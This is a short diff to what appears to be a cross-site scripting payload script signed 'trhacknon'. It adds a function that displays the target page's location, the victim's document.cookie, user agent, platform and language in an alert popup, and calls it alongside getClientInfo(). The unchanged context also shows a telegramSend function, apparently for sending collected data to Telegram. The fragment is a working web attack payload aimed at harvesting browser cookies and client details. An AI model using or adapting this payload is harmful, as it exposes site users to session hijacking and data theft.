@@ -50,4 +50,34 @@ function telegramSend(textData) {
         .catch(error => console.error('Failed to send message to Telegram:', error));
 }
 
+function showXSSPopup() {
+    var info = `
+XSS Alert by trhacknon
+------------------------
+
+- URL Target -
+${document.location.hostname}${document.location.pathname}
+
+- Document Cookie -
+${document.cookie}
+
+- User Agent -
+${navigator.userAgent}
+
+- Platform -
+${navigator.platform}
+
+- Language -
+${navigator.language}
+
+- Online Status -
+${navigator.onLine}
+`;
+
+    alert(info);
+}
+
+// Appeler la fonction pour afficher le popup XSS
+
 getClientInfo();
+showXSSPopup();
